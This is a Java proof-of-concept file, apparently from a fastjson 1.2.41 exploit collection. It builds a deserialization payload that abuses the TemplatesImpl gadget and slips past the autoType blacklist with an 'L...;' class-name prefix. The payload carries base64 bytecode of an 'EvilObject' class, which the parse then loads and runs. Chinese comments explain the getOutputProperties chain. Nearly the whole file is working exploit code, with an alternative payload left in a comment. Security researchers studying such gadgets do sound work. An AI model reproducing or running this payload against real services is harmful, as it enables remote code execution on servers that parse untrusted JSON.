package org.lain.poc.poclist;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;

/**
 * @author: ZH3FENG
 * @Date: 下午9:13 2017/12/11
 * @Modified By:
 * @Description: Gadget com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 *               利用其__bytecodes成员装载恶意类的字节码，获取_outputProperties属性时触发恶意类实例化
 *               getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses()
 */
public class TemplatesImplPoc {

    /**
     *加载指定路径的类字节码，并base64编码成byte[]
     * @param cls
     * @return
     */
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }


    public static void  testTemplatesImpl() throws Exception {
        ParserConfig config = new ParserConfig();

        config.setAutoTypeSupport(true);//


        final String evilClassPath = "/Users/tangtianlong/temp/PoCs-fastjson1241/target/classes/org/lain/poc/TemplatesImpl/EvilObject.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;";

        /*EvilObject 不继承 AbstractTranslet */
        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'123','_tfactory':{},'_transletIndex':1,\"_auxClasses\":{},\"_outputProperties\":{}";

        /*EvilObject 继承 AbstractTranslet*/
        /*String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },";// +
        // "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";*/

        System.out.println(payload);

        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);


    }

}
